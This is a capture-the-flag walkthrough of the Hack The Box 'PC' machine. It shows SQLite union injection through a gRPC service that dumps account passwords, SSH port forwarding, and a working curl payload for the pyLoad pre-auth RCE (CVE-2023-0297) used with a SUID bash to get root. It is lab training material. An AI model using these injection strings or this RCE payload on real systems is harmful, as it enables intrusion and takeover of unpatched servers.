### Basic infor
* https://app.hackthebox.com/machines/PC
* IP: 10.10.11.214
### Scan
TCP: 
```bash
#rustscan -t 1500 -b 1500 --ulimit 65000 -a 10.10.11.214 -- -sV -sC -oN nmap.txt
#Nmap 7.92 scan initiated Sun May 21 09:36:08 2023 as: nmap -vvv -p 22,50051 -sV -sC -oN nmap.txt -Pn 10.10.11.214
Nmap scan report for 10.10.11.214 (10.10.11.214)
Host is up, received user-set (0.069s latency).
Scanned at 2023-05-21 09:36:08 +07 for 20s

PORT      STATE SERVICE REASON  VERSION
22/tcp    open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
50051/tcp open  unknown syn-ack

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun May 21 09:36:28 2023 -- 1 IP address (1 host up) scanned in 20.53 seconds
```

##### Recon

from the port. google first a few bytes
```bash
00000000: 0000 1804 0000 0000 0000 0400 3fff ff00 ............?... 
00000010: 0500 3fff ff00 0600 0020 00fe 0300 0000 ..?...... ...... 
00000020: 0100 0004 0800 0000 0000 003f 0000      ...........?..
```

=> port 50051: gRPC. 

[fullstorydev/grpcui: An interactive web UI for gRPC, along the lines of postman (github.com)](https://github.com/fullstorydev/grpcui) 

```bash


# lỗi biến môi trường
[grpc - grpcui: command not found - Stack Overflow](https://stackoverflow.com/questions/64483034/grpcui-command-not-found)

grpcui -plaintext 10.10.11.214:50051

```

after Login with `admin:admin` . The response

```json
{
  "message": "Your id is 439."
}

b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODQ2NTAxNDV9.whHUQcZrxATSTMfQRXEIShcDNBKVJuRCnS8GuHVr168'
```

add token header, getInfor()

![[Pasted image 20230521103605.png]]

##### SQLite Injection
[PayloadsAllTheThings/SQLite Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md) .

```json

"id":"0 union select sqlite_version();"
// response
message": "3.31.1

"id" : "0 union SELECT GROUP_CONCAT(password) from accounts" 
// response
"message": "admin,HereIsYourPassWord1431,asdf"

"id" : "and 0 union SELECT GROUP_CONCAT(username) from accounts"
// response
"message": "admin,sau"
```

creds `sau:HereIsYourPassWord1431` 
##### User
```bash
┌─[loc@parrot]─[~/HackTheBox/Easy/PC]
└──╼ $ssh sau@10.10.11.214
The authenticity of host '10.10.11.214 (10.10.11.214)' can't be established.
ECDSA key fingerprint is SHA256:1g85rB6ht6M95bNqeghJZT5nAhCfSdKOoWWx7TE+5Ck.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.214' (ECDSA) to the list of known hosts.
sau@10.10.11.214's password: 
Last login: Sat May 20 23:45:07 2023 from 127.0.0.1
-bash-5.0$ id & hostname
[1] 22831
pc
-bash-5.0$ uid=1001(sau) gid=1001(sau) groups=1001(sau)
```

8000 port open on localhost, seem interesting. 

```bash
bash-5.0$ netstat -tulwn 
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:9666            0.0.0.0:*               LISTEN     
tcp6       0      0 :::50051                :::*                    LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN     
udp        0      0 127.0.0.53:53           0.0.0.0:*                          
udp        0      0 0.0.0.0:68              0.0.0.0:*                         
```

Portfoward using SSH

```bash
ssh sau@10.10.11.214 -L 8000:127.0.0.1:8000
```

pyLoad
![[Pasted image 20230521104945.png]]

#### Root
```bash
curl -i -s -k -X $'POST' --data-binary $'jk=pyimport%20os;os.system(\"<UrlEncode_cmd>");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' $'http://127.0.0.1:8000/flash/addcrypted2'
```

reverse shell is not needed, a simple SUID bash works fine.
RCE to `chmod u+s /bin/bash,` and after execute `/bin/bash -p`

Testing create a /tmp/pwndLoc
```bash
┌─[✗]─[loc@parrot]─[~]
└──╼ $curl -i -s -k -X $'POST' --data-binary $'jk=pyimport%20os;os.system(\"touch%20/tmp/pwndLoc\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' $'http://127.0.0.1:8000/flash/addcrypted2'
HTTP/1.1 500 INTERNAL SERVER ERROR
Content-Type: text/html; charset=utf-8
Content-Length: 21
Access-Control-Max-Age: 1800
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: OPTIONS, GET, POST
Vary: Accept-Encoding
Date: Sun, 21 May 2023 04:01:52 GMT
Server: Cheroot/8.6.0

Could not decrypt key┌─[loc@parrot]─[~]
```

```bash
-bash-5.0$ ls -la /tmp
total 872
drwxrwxrwt 15 root root   4096 May 21 04:01 .
drwxr-xr-x 21 root root   4096 Apr 27 15:23 ..
drwxrwxrwt  2 root root   4096 May 20 19:00 .ICE-unix
drwxrwxrwt  2 root root   4096 May 20 19:00 .Test-unix
drwxrwxrwt  2 root root   4096 May 20 19:00 .X11-unix
drwxrwxrwt  2 root root   4096 May 20 19:00 .XIM-unix
drwxrwxrwt  2 root root   4096 May 20 19:00 .font-unix
-rwxrwxr-x  1 sau  sau  828145 Feb 19 04:30 linpeas.sh
-rw-r--r--  1 root root      0 May 21 04:01 pwndLoc
drwxr-xr-x  4 root root   4096 May 20 19:00 pyLoad
drwx------  3 root root   4096 May 20 19:00 snap-private-tmp
drwx------  3 root root   4096 May 20 19:00 systemd-private-bd799cc0e79b420c893f5785258585a7-ModemManager.service-IS0sdj
drwx------  3 root root   4096 May 20 19:00 systemd-private-bd799cc0e79b420c893f5785258585a7-systemd-logind.service-wbaUVg
drwx------  3 root root   4096 May 20 19:00 systemd-private-bd799cc0e79b420c893f5785258585a7-systemd-resolved.service-0ekU2h
drwx------  2 root root   4096 May 20 19:00 tmpti58e57e
drwx------  2 sau  sau    4096 May 20 23:28 tmux-1001
drwx------  2 root root   4096 May 20 19:00 vmware-root_737-4257003961

```

#### Additional references
- [Pre-auth RCE vulnerability found in pyload (huntr.dev)](https://huntr.dev/bounties/3fd606f7-83e1-4265-b083-2e1889a05e65/)
- [bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad: CVE-2023-0297](https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad) 